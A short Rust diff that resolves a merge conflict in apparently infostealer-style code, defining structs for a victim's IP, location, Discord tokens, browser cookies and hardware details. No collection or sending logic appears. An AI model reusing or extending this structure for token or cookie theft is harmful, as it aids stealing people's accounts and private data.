@@ -9,7 +9,6 @@ pub struct Extractor {
 
 #[derive(Serialize, Deserialize, Default)]
 pub struct ExtractedData {
-<<<<<<< HEAD
     ip: String,
     location: String,
     tokens: Vec<String>,
@@ -17,11 +16,6 @@ pub struct ExtractedData {
     timestamp: u64,
     #[serde(default)]
     browser_cookies: Vec<BrowserCookie>,
-=======
-    discord_tokens: Vec<String>,
-    browser_cookies: Vec<BrowserCookie>,
-    system_info: SystemInfo,
->>>>>>> main
 }
 
 #[derive(Serialize, Deserialize, Default)]
@@ -35,7 +29,6 @@ struct BrowserCookie {
 
 #[derive(Serialize, Deserialize, Default)]
 struct SystemInfo {
-<<<<<<< HEAD
   #[serde(default)]
   user_agent: Option<String>,
   os: String,
@@ -46,18 +39,6 @@ struct SystemInfo {
 }
 
 
-=======
-    ip: String,
-    location: String,
-    user_agent: String,
-    os: String,
-    cpu: String,
-    gpu: String,
-    ram: u64,
-    timestamp: u64,
-}
-
->>>>>>> main
 impl Extractor {
     pub fn new() -> Self {
         Extractor {}
